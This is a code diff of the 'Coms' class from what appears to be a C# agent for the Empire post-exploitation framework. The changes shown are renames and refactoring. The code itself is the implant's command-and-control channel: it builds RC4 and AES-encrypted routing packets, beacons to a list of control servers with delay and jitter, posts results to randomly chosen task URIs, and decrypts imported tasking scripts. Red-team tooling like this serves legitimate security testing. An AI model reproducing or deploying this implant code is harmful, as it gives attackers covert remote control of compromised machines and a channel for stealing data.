@@ -1,6 +1,5 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Collections.ObjectModel;
 using System.IO;
 using System.Linq;
 using System.Net;
@@ -9,7 +8,10 @@ using System.Security.Cryptography;
 using System.Text;
 using System.Threading;
 
-namespace WheresMyImplant
+using WheresMyImplant;
+using MonkeyWorks;
+
+namespace Empire
 {
     class Coms : Base
     {
@@ -19,12 +21,12 @@ namespace WheresMyImplant
         private String sessionKey { get; set; }
         private Byte[] sessionKeyBytes { get; set; }
 
-        public Int32 agentDelay {get; set;}
-        public Int32 agentJitter { get; set; }
-        public Int32 sleepTime { get; set; }
+        internal Int32 agentDelay {get; set;}
+        internal Int32 agentJitter { get; set; }
+        internal Int32 sleepTime { get; set; }
 
-        public Int32 missedCheckins { get; set; }
-        public Int32 lostLimit { get; set; }
+        internal Int32 missedCheckins { get; set; }
+        internal Int32 lostLimit { get; set; }
 
         private Int32 ServerIndex = 0;
         private String[] controlServers { get; set; }
@@ -62,17 +64,17 @@ namespace WheresMyImplant
             }
 
             byte[] data = Encoding.ASCII.GetBytes(sessionId);
-            data = Misc.combine(data, new byte[4] { 0x01, Convert.ToByte(meta), 0x00, 0x00 });
-            data = Misc.combine(data, BitConverter.GetBytes(encryptedBytesLength));
+            data = Combine.combine(data, new byte[4] { 0x01, Convert.ToByte(meta), 0x00, 0x00 });
+            data = Combine.combine(data, BitConverter.GetBytes(encryptedBytesLength));
 
             byte[] initializationVector = newInitializationVector(4);
-            byte[] rc4Key = Misc.combine(initializationVector, stagingKeyBytes);
+            byte[] rc4Key = Combine.combine(initializationVector, stagingKeyBytes);
             byte[] routingPacketData = EmpireStager.rc4Encrypt(rc4Key, data);
 
-            routingPacketData = Misc.combine(initializationVector, routingPacketData);
+            routingPacketData = Combine.combine(initializationVector, routingPacketData);
             if (encryptedBytes != null && encryptedBytes.Length > 0)
             {
-                routingPacketData = Misc.combine(routingPacketData, encryptedBytes);
+                routingPacketData = Combine.combine(routingPacketData, encryptedBytes);
             }
 
             return routingPacketData;
@@ -95,7 +97,7 @@ namespace WheresMyImplant
                 byte[] routingEncryptedData = packetData.Skip(4).Take(16).ToArray();
                 offset += 20;
 
-                byte[] rc4Key = Misc.combine(routingInitializationVector, stagingKeyBytes);
+                byte[] rc4Key = Combine.combine(routingInitializationVector, stagingKeyBytes);
 
                 byte[] routingData = EmpireStager.rc4Encrypt(rc4Key, routingEncryptedData);
                 String packetSessionId = Encoding.UTF8.GetString(routingData.Take(8).ToArray());
@@ -104,9 +106,9 @@ namespace WheresMyImplant
                     byte language = routingPacket[8];
                     byte metaData = routingPacket[9];
                 }
-                catch (IndexOutOfRangeException error)
+                catch (IndexOutOfRangeException ex)
                 {
-                    WriteOutputBad(error.ToString());
+                    Console.WriteLine("[-] {0}", ex.Message);
                 }
                 byte[] extra = routingPacket.Skip(10).Take(2).ToArray();
                 UInt32 packetLength = BitConverter.ToUInt32(routingData, 12);
@@ -124,9 +126,9 @@ namespace WheresMyImplant
                     {
                         processTaskingPackets(encryptedData);
                     }
-                    catch (Exception error)
+                    catch (Exception ex)
                     {
-                        WriteOutputBad(error.ToString());
+                        Console.WriteLine("[-] {0}", ex.Message);
                     }
                 }
             }
@@ -176,12 +178,12 @@ namespace WheresMyImplant
                 ICryptoTransform encryptor = aesCrypto.CreateEncryptor();
                 encryptedBytes = encryptor.TransformFinalBlock(packets, 0, packets.Length);
             }
-            encryptedBytes = Misc.combine(ivBytes, encryptedBytes);
+            encryptedBytes = Combine.combine(ivBytes, encryptedBytes);
 
             HMACSHA256 hmac = new HMACSHA256();
             hmac.Key = sessionKeyBytes;
             Byte[] hmacBytes = hmac.ComputeHash(encryptedBytes).Take(10).ToArray();
-            encryptedBytes = Misc.combine(encryptedBytes, hmacBytes);
+            encryptedBytes = Combine.combine(encryptedBytes, hmacBytes);
 
             Byte[] routingPacket = newRoutingPacket(encryptedBytes, 5);
 
@@ -200,9 +202,9 @@ namespace WheresMyImplant
                     String taskUri = taskURIs[random.Next(taskURIs.Length)];
                     Byte[] response = webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
                 }
-                catch (WebException error)
+                catch (WebException ex)
                 {
-                    WriteOutputBad(error.ToString());
+                    Console.WriteLine("[-] {0}", ex.Message);
                 }
             }
 
@@ -318,16 +320,16 @@ namespace WheresMyImplant
         // Working
         ////////////////////////////////////////////////////////////////////////////////
         [StructLayout(LayoutKind.Sequential, Pack = 1)]
-        public struct PACKET
+        internal struct PACKET
         {
             [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
-            public UInt16 type;
-            public UInt16 totalPackets;
-            public UInt16 packetNumber;
-            public UInt16 taskId;
-            public UInt32 length;
-            public String data;
-            public String remaining;
+            internal UInt16 type;
+            internal UInt16 totalPackets;
+            internal UInt16 packetNumber;
+            internal UInt16 taskId;
+            internal UInt32 length;
+            internal String data;
+            internal String remaining;
         };
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -362,7 +364,7 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public Byte[] task41(PACKET packet)
+        internal Byte[] task41(PACKET packet)
         {
             try
             {
@@ -501,7 +503,7 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public Byte[] task101(Coms.PACKET packet)
+        internal Byte[] task101(Coms.PACKET packet)
         {
             String prefix = packet.data.Substring(0, 15);
             String extension = packet.data.Substring(15, 5);
@@ -510,7 +512,7 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public Byte[] task120(Coms.PACKET packet)
+        internal Byte[] task120(Coms.PACKET packet)
         {
             Random random = new Random();
             Byte[] initializationVector = new Byte[16];
@@ -520,7 +522,7 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public Byte[] task121(Coms.PACKET packet)
+        internal Byte[] task121(Coms.PACKET packet)
         {
             Byte[] scriptBytes = EmpireStager.aesDecrypt(sessionKey, jobTracking.importedScript);
             String script = Encoding.UTF8.GetString(scriptBytes);
